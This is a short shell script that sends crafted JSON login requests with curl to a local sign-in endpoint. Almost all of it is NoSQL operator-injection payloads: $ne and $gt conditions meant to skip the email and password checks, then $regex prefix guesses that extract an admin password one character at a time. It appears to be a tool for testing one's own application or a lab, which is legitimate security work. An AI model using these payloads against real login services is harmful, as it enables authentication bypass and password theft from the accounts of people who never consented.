#!/usr/bin/env sh

login() {
	curl \
    -s \
    -D -\
		-H 'Content-Type: application/json' \
		-d "$1" \
    'https://localhost:3000/auth/signin'
}

login "$1"
#-d "{\"email\":\"$1\", \"password\":\"P@ssw0rd12345\"}" \
login "{\"email\": {\"\$ne\": null}, \"password\": {\"\$ne\": null}}"
login "{\"email\": {\"\$ne\": \"foo\"}, \"password\": {\"\$ne\": \"bar\"}}"
login "{\"email\": {\"\$gt\": undefined}, \"password\": {\"\$gt\": undefined}}"
login "{\"email\": {\"\$gt\":\"\"}, \"password\": {\"\$gt\":\"\"}}"
login "{\"email\": {\"\$eq\": \"admin\"}, \"password\": {\"\$regex\": \"^m\" }}"
login "{\"email\": {\"\$eq\": \"admin\"}, \"password\": {\"\$regex\": \"^md\" }}"
login "{\"email\": {\"\$eq\": \"admin\"}, \"password\": {\"\$regex\": \"^mdp\" }}"
